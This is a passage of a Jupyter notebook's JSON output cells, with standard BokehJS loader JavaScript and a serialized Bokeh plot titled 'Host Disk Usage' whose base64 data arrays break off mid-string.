       "  function handleAddOutput(event, handle) {\n",
       "    var output_area = handle.output_area;\n",
       "    var output = handle.output;\n",
       "\n",
       "    // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only\n",
       "    if ((output.output_type != \"display_data\") || (!output.data.hasOwnProperty(EXEC_MIME_TYPE))) {\n",
       "      return\n",
       "    }\n",
       "\n",
       "    var toinsert = output_area.element.find(\".\" + CLASS_NAME.split(' ')[0]);\n",
       "\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"id\"] !== undefined) {\n",
       "      toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];\n",
       "      // store reference to embed id on output_area\n",
       "      output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE][\"id\"];\n",
       "    }\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"server_id\"] !== undefined) {\n",
       "      var bk_div = document.createElement(\"div\");\n",
       "      bk_div.innerHTML = output.data[HTML_MIME_TYPE];\n",
       "      var script_attrs = bk_div.children[0].attributes;\n",
       "      for (var i = 0; i < script_attrs.length; i++) {\n",
       "        toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);\n",
       "        toinsert[toinsert.length - 1].firstChild.textContent = bk_div.children[0].textContent\n",
       "      }\n",
       "      // store reference to server id on output_area\n",
       "      output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE][\"server_id\"];\n",
       "    }\n",
       "  }\n",
       "\n",
       "  function register_renderer(events, OutputArea) {\n",
       "\n",
       "    function append_mime(data, metadata, element) {\n",
       "      // create a DOM node to render to\n",
       "      var toinsert = this.create_output_subarea(\n",
       "        metadata,\n",
       "        CLASS_NAME,\n",
       "        EXEC_MIME_TYPE\n",
       "      );\n",
       "      this.keyboard_manager.register_events(toinsert);\n",
       "      // Render to node\n",
       "      var props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};\n",
       "      render(props, toinsert[toinsert.length - 1]);\n",
       "      element.append(toinsert);\n",
       "      return toinsert\n",
       "    }\n",
       "\n",
       "    /* Handle when an output is cleared or removed */\n",
       "    events.on('clear_output.CodeCell', handleClearOutput);\n",
       "    events.on('delete.Cell', handleClearOutput);\n",
       "\n",
       "    /* Handle when a new output is added */\n",
       "    events.on('output_added.OutputArea', handleAddOutput);\n",
       "\n",
       "    /**\n",
       "     * Register the mime type and append_mime function with output_area\n",
       "     */\n",
       "    OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {\n",
       "      /* Is output safe? */\n",
       "      safe: true,\n",
       "      /* Index of renderer in `output_area.display_order` */\n",
       "      index: 0\n",
       "    });\n",
       "  }\n",
       "\n",
       "  // register the mime type if in Jupyter Notebook environment and previously unregistered\n",
       "  if (root.Jupyter !== undefined) {\n",
       "    var events = require('base/js/events');\n",
       "    var OutputArea = require('notebook/js/outputarea').OutputArea;\n",
       "\n",
       "    if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {\n",
       "      register_renderer(events, OutputArea);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  \n",
       "  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n",
       "    root._bokeh_timeout = Date.now() + 5000;\n",
       "    root._bokeh_failed_load = false;\n",
       "  }\n",
       "\n",
       "  var NB_LOAD_WARNING = {'data': {'text/html':\n",
       "     \"<div style='background-color: #fdd'>\\n\"+\n",
       "     \"<p>\\n\"+\n",
       "     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n",
       "     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n",
       "     \"</p>\\n\"+\n",
       "     \"<ul>\\n\"+\n",
       "     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n",
       "     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n",
       "     \"</ul>\\n\"+\n",
       "     \"<code>\\n\"+\n",
       "     \"from bokeh.resources import INLINE\\n\"+\n",
       "     \"output_notebook(resources=INLINE)\\n\"+\n",
       "     \"</code>\\n\"+\n",
       "     \"</div>\"}};\n",
       "\n",
       "  function display_loaded() {\n",
       "    var el = document.getElementById(\"4966\");\n",
       "    if (el != null) {\n",
       "      el.textContent = \"BokehJS is loading...\";\n",
       "    }\n",
       "    if (root.Bokeh !== undefined) {\n",
       "      if (el != null) {\n",
       "        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n",
       "      }\n",
       "    } else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(display_loaded, 100)\n",
       "    }\n",
       "  }\n",
       "\n",
       "\n",
       "  function run_callbacks() {\n",
       "    try {\n",
       "      root._bokeh_onload_callbacks.forEach(function(callback) {\n",
       "        if (callback != null)\n",
       "          callback();\n",
       "      });\n",
       "    } finally {\n",
       "      delete root._bokeh_onload_callbacks\n",
       "    }\n",
       "    console.debug(\"Bokeh: all callbacks have finished\");\n",
       "  }\n",
       "\n",
       "  function load_libs(css_urls, js_urls, callback) {\n",
       "    if (css_urls == null) css_urls = [];\n",
       "    if (js_urls == null) js_urls = [];\n",
       "\n",
       "    root._bokeh_onload_callbacks.push(callback);\n",
       "    if (root._bokeh_is_loading > 0) {\n",
       "      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n",
       "      return null;\n",
       "    }\n",
       "    if (js_urls == null || js_urls.length === 0) {\n",
       "      run_callbacks();\n",
       "      return null;\n",
       "    }\n",
       "    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n",
       "    root._bokeh_is_loading = css_urls.length + js_urls.length;\n",
       "\n",
       "    function on_load() {\n",
       "      root._bokeh_is_loading--;\n",
       "      if (root._bokeh_is_loading === 0) {\n",
       "        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n",
       "        run_callbacks()\n",
       "      }\n",
       "    }\n",
       "\n",
       "    function on_error() {\n",
       "      console.error(\"failed to load \" + url);\n",
       "    }\n",
       "\n",
       "    for (var i = 0; i < css_urls.length; i++) {\n",
       "      var url = css_urls[i];\n",
       "      const element = document.createElement(\"link\");\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error;\n",
       "      element.rel = \"stylesheet\";\n",
       "      element.type = \"text/css\";\n",
       "      element.href = url;\n",
       "      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n",
       "      document.body.appendChild(element);\n",
       "    }\n",
       "\n",
       "    const hashes = {\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\": \"kLr4fYcqcSpbuI95brIH3vnnYCquzzSxHPU6XGQCIkQRGJwhg0StNbj1eegrHs12\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\": \"xIGPmVtaOm+z0BqfSOMn4lOR6ciex448GIKG4eE61LsAvmGj48XcMQZtKcE/UXZe\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\": \"Dc9u1wF/0zApGIWoBbH77iWEHtdmkuYWG839Uzmv8y8yBLXebjO9ZnERsde5Ln/P\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\": \"cT9JaBz7GiRXdENrJLZNSC6eMNF3nh3fa5fTF51Svp+ukxPdwcU5kGXGPBgDCa2j\"};\n",
       "\n",
       "    for (var i = 0; i < js_urls.length; i++) {\n",
       "      var url = js_urls[i];\n",
       "      var element = document.createElement('script');\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error;\n",
       "      element.async = false;\n",
       "      element.src = url;\n",
       "      if (url in hashes) {\n",
       "        element.crossOrigin = \"anonymous\";\n",
       "        element.integrity = \"sha384-\" + hashes[url];\n",
       "      }\n",
       "      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n",
       "      document.head.appendChild(element);\n",
       "    }\n",
       "  };\n",
       "\n",
       "  function inject_raw_css(css) {\n",
       "    const element = document.createElement(\"style\");\n",
       "    element.appendChild(document.createTextNode(css));\n",
       "    document.body.appendChild(element);\n",
       "  }\n",
       "\n",
       "  \n",
       "  var js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\"];\n",
       "  var css_urls = [];\n",
       "  \n",
       "\n",
       "  var inline_js = [\n",
       "    function(Bokeh) {\n",
       "      Bokeh.set_log_level(\"info\");\n",
       "    },\n",
       "    function(Bokeh) {\n",
       "    \n",
       "    \n",
       "    }\n",
       "  ];\n",
       "\n",
       "  function run_inline_js() {\n",
       "    \n",
       "    if (root.Bokeh !== undefined || force === true) {\n",
       "      \n",
       "    for (var i = 0; i < inline_js.length; i++) {\n",
       "      inline_js[i].call(root, root.Bokeh);\n",
       "    }\n",
       "    if (force === true) {\n",
       "        display_loaded();\n",
       "      }} else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(run_inline_js, 100);\n",
       "    } else if (!root._bokeh_failed_load) {\n",
       "      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n",
       "      root._bokeh_failed_load = true;\n",
       "    } else if (force !== true) {\n",
       "      var cell = $(document.getElementById(\"4966\")).parents('.cell').data().cell;\n",
       "      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n",
       "    }\n",
       "\n",
       "  }\n",
       "\n",
       "  if (root._bokeh_is_loading === 0) {\n",
       "    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n",
       "    run_inline_js();\n",
       "  } else {\n",
       "    load_libs(css_urls, js_urls, function() {\n",
       "      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n",
       "      run_inline_js();\n",
       "    });\n",
       "  }\n",
       "}(window));"
      ],
      "application/vnd.bokehjs_load.v0+json": "\n(function(root) {\n  function now() {\n    return new Date();\n  }\n\n  var force = true;\n\n  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n    root._bokeh_onload_callbacks = [];\n    root._bokeh_is_loading = undefined;\n  }\n\n  \n\n  \n  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n    root._bokeh_timeout = Date.now() + 5000;\n    root._bokeh_failed_load = false;\n  }\n\n  var NB_LOAD_WARNING = {'data': {'text/html':\n     \"<div style='background-color: #fdd'>\\n\"+\n     \"<p>\\n\"+\n     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n     \"</p>\\n\"+\n     \"<ul>\\n\"+\n     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n     \"</ul>\\n\"+\n     \"<code>\\n\"+\n     \"from bokeh.resources import INLINE\\n\"+\n     \"output_notebook(resources=INLINE)\\n\"+\n     \"</code>\\n\"+\n     \"</div>\"}};\n\n  function display_loaded() {\n    var el = document.getElementById(\"4966\");\n    if (el != null) {\n      el.textContent = \"BokehJS is loading...\";\n    }\n    if (root.Bokeh !== undefined) {\n      if (el != null) {\n        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n      }\n    } else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(display_loaded, 100)\n    }\n  }\n\n\n  function run_callbacks() {\n    try {\n      root._bokeh_onload_callbacks.forEach(function(callback) {\n        if (callback != null)\n          callback();\n      });\n    } finally {\n      delete root._bokeh_onload_callbacks\n    }\n    console.debug(\"Bokeh: all callbacks have finished\");\n  }\n\n  function load_libs(css_urls, js_urls, callback) {\n    if (css_urls == null) css_urls = [];\n    if (js_urls == null) js_urls = [];\n\n    root._bokeh_onload_callbacks.push(callback);\n    if (root._bokeh_is_loading > 0) {\n      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n      return null;\n    }\n    if (js_urls == null || js_urls.length === 0) {\n      run_callbacks();\n      return null;\n    }\n    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n    root._bokeh_is_loading = css_urls.length + js_urls.length;\n\n    function on_load() {\n      root._bokeh_is_loading--;\n      if (root._bokeh_is_loading === 0) {\n        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n        run_callbacks()\n      }\n    }\n\n    function on_error() {\n      console.error(\"failed to load \" + url);\n    }\n\n    for (var i = 0; i < css_urls.length; i++) {\n      var url = css_urls[i];\n      const element = document.createElement(\"link\");\n      element.onload = on_load;\n      element.onerror = on_error;\n      element.rel = \"stylesheet\";\n      element.type = \"text/css\";\n      element.href = url;\n      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n      document.body.appendChild(element);\n    }\n\n    const hashes = {\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\": \"kLr4fYcqcSpbuI95brIH3vnnYCquzzSxHPU6XGQCIkQRGJwhg0StNbj1eegrHs12\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\": \"xIGPmVtaOm+z0BqfSOMn4lOR6ciex448GIKG4eE61LsAvmGj48XcMQZtKcE/UXZe\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\": \"Dc9u1wF/0zApGIWoBbH77iWEHtdmkuYWG839Uzmv8y8yBLXebjO9ZnERsde5Ln/P\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\": \"cT9JaBz7GiRXdENrJLZNSC6eMNF3nh3fa5fTF51Svp+ukxPdwcU5kGXGPBgDCa2j\"};\n\n    for (var i = 0; i < js_urls.length; i++) {\n      var url = js_urls[i];\n      var element = document.createElement('script');\n      element.onload = on_load;\n      element.onerror = on_error;\n      element.async = false;\n      element.src = url;\n      if (url in hashes) {\n        element.crossOrigin = \"anonymous\";\n        element.integrity = \"sha384-\" + hashes[url];\n      }\n      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n      document.head.appendChild(element);\n    }\n  };\n\n  function inject_raw_css(css) {\n    const element = document.createElement(\"style\");\n    element.appendChild(document.createTextNode(css));\n    document.body.appendChild(element);\n  }\n\n  \n  var js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\"];\n  var css_urls = [];\n  \n\n  var inline_js = [\n    function(Bokeh) {\n      Bokeh.set_log_level(\"info\");\n    },\n    function(Bokeh) {\n    \n    \n    }\n  ];\n\n  function run_inline_js() {\n    \n    if (root.Bokeh !== undefined || force === true) {\n      \n    for (var i = 0; i < inline_js.length; i++) {\n      inline_js[i].call(root, root.Bokeh);\n    }\n    if (force === true) {\n        display_loaded();\n      }} else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(run_inline_js, 100);\n    } else if (!root._bokeh_failed_load) {\n      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n      root._bokeh_failed_load = true;\n    } else if (force !== true) {\n      var cell = $(document.getElementById(\"4966\")).parents('.cell').data().cell;\n      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n    }\n\n  }\n\n  if (root._bokeh_is_loading === 0) {\n    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n    run_inline_js();\n  } else {\n    load_libs(css_urls, js_urls, function() {\n      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n      run_inline_js();\n    });\n  }\n}(window));"
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "  <div class=\"bk-root\" id=\"da7a5e15-3093-48f4-a23d-16053db8a98c\" data-root-id=\"4968\"></div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "(function(root) {\n",
       "  function embed_document(root) {\n",
       "    \n",
       "  var docs_json = {\"b4632373-7484-422f-a550-d2bd9a0a7b5a\":{\"roots\":{\"references\":[{\"attributes\":{\"below\":[{\"id\":\"4979\"}],\"center\":[{\"id\":\"4982\"},{\"id\":\"4986\"},{\"id\":\"5027\"}],\"left\":[{\"id\":\"4983\"}],\"min_border_left\":50,\"plot_height\":400,\"plot_width\":900,\"renderers\":[{\"id\":\"5006\"},{\"id\":\"5033\"},{\"id\":\"5061\"}],\"title\":{\"id\":\"4969\"},\"toolbar\":{\"id\":\"4993\"},\"toolbar_location\":\"above\",\"x_range\":{\"id\":\"4971\"},\"x_scale\":{\"id\":\"4975\"},\"y_range\":{\"id\":\"4973\"},\"y_scale\":{\"id\":\"4977\"}},\"id\":\"4968\",\"subtype\":\"Figure\",\"type\":\"Plot\"},{\"attributes\":{},\"id\":\"4975\",\"type\":\"LinearScale\"},{\"attributes\":{\"bottom_units\":\"screen\",\"fill_alpha\":0.5,\"fill_color\":\"lightgrey\",\"left_units\":\"screen\",\"level\":\"overlay\",\"line_alpha\":1.0,\"line_color\":\"black\",\"line_dash\":[4,4],\"line_width\":2,\"right_units\":\"screen\",\"top_units\":\"screen\"},\"id\":\"4992\",\"type\":\"BoxAnnotation\"},{\"attributes\":{\"months\":[0,2,4,6,8,10]},\"id\":\"5023\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]},\"id\":\"5022\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"text\":\"Host Disk Usage\"},\"id\":\"4969\",\"type\":\"Title\"},{\"attributes\":{\"line_alpha\":0.7,\"line_color\":\"#440154\",\"line_width\":2,\"x\":{\"field\":\"Time\"},\"y\":{\"field\":\"Data\"}},\"id\":\"5004\",\"type\":\"Line\"},{\"attributes\":{},\"id\":\"5042\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"line_alpha\":0.7,\"line_color\":\"#FDE724\",\"line_width\":2,\"x\":{\"field\":\"Time\"},\"y\":{\"field\":\"Data\"}},\"id\":\"5059\",\"type\":\"Line\"},{\"attributes\":{\"line_alpha\":0.1,\"line_color\":\"#440154\",\"line_width\":2,\"x\":{\"field\":\"Time\"},\"y\":{\"field\":\"Data\"}},\"id\":\"5005\",\"type\":\"Line\"},{\"attributes\":{\"days\":[1,15]},\"id\":\"5021\",\"type\":\"DaysTicker\"},{\"attributes\":{},\"id\":\"4989\",\"type\":\"ResetTool\"},{\"attributes\":{\"num_minor_ticks\":10,\"tickers\":[{\"id\":\"5015\"},{\"id\":\"5016\"},{\"id\":\"5017\"},{\"id\":\"5018\"},{\"id\":\"5019\"},{\"id\":\"5020\"},{\"id\":\"5021\"},{\"id\":\"5022\"},{\"id\":\"5023\"},{\"id\":\"5024\"},{\"id\":\"5025\"},{\"id\":\"5026\"}]},\"id\":\"4980\",\"type\":\"DatetimeTicker\"},{\"attributes\":{\"axis\":{\"id\":\"4979\"},\"grid_line_alpha\":0.3,\"grid_line_color\":\"navy\",\"minor_grid_line_alpha\":0.1,\"minor_grid_line_color\":\"navy\",\"ticker\":null},\"id\":\"4982\",\"type\":\"Grid\"},{\"attributes\":{\"axis_label\":\"Event Time\",\"formatter\":{\"id\":\"5000\"},\"ticker\":{\"id\":\"4980\"}},\"id\":\"4979\",\"type\":\"DatetimeAxis\"},{\"attributes\":{\"source\":{\"id\":\"5002\"}},\"id\":\"5007\",\"type\":\"CDSView\"},{\"attributes\":{\"months\":[0,4,8]},\"id\":\"5024\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"end\":1594292040000.0,\"start\":1592741160000.0},\"id\":\"4971\",\"type\":\"Range1d\"},{\"attributes\":{\"items\":[{\"id\":\"5028\"},{\"id\":\"5056\"},{\"id\":\"5086\"}]},\"id\":\"5027\",\"type\":\"Legend\"},{\"attributes\":{\"line_alpha\":0.7,\"line_color\":\"#208F8C\",\"line_width\":2,\"x\":{\"field\":\"Time\"},\"y\":{\"field\":\"Data\"}},\"id\":\"5031\",\"type\":\"Line\"},{\"attributes\":{\"data_source\":{\"id\":\"5002\"},\"glyph\":{\"id\":\"5004\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"5005\"},\"selection_glyph\":null,\"view\":{\"id\":\"5007\"}},\"id\":\"5006\",\"type\":\"GlyphRenderer\"},{\"attributes\":{},\"id\":\"5043\",\"type\":\"Selection\"},{\"attributes\":{\"data\":{\"Data\":{\"__ndarray__\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABSuj6bSu+dB16NAAeFc1UFI4XqIwGLcQWZmRtPESNZB\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[360]},\"Time\":{\"__ndarray__\":\"AAAAl+ctd0IAAOgF6y13QgAA0HTuLXdCAAC44/Etd0IAAKBS9S13QgAAiMH4LXdCAABwMPwtd0IAAFif/y13QgAAQA4DLndCAAAofQYud0IAABDsCS53QgAA+FoNLndCAADgyRAud0IAAMg4FC53QgAAsKcXLndCAACYFhsud0IAAICFHi53QgAAaPQhLndCAABQYyUud0IAADjSKC53QgAAIEEsLndCAAAIsC8ud0IAAPAeMy53QgAA2I02LndCAADA/Dkud0IAAKhrPS53QgAAkNpALndCAAB4SUQud0IAAGC4Ry53QgAASCdLLndCAAAwlk4ud0IAABgFUi53QgAAAHRVLndCAADo4lgud0IAANBRXC53QgAAuMBfLndCAACgL2Mud0IAAIieZi53QgAAcA1qLndCAABYfG0ud0IAAEDrcC53QgAAKFp0LndCAAAQyXcud0IAAPg3ey53QgAA4KZ+LndCAADIFYIud0IAALCEhS53QgAAmPOILndCAACAYowud0IAAGjRjy53QgAAUECTLndCAAA4r5Yud0IAACAemi53QgAACI2dLndCAADw+6Aud0IAANhqpC53QgAAwNmnLndCAACoSKsud0IAAJC3ri53QgAAeCayLndCAABglbUud0IAAEgEuS53QgAAMHO8LndCAAAY4r8ud0IAAABRwy53QgAA6L/GLndCAADQLsoud0IAALidzS53QgAAoAzRLndCAACIe9Qud0IAAHDq1y53QgAAWFnbLndCAABAyN4ud0IAACg34i53QgAAEKblLndCAAD4FOkud0IAAOCD7C53QgAAyPLvLndCAACwYfMud0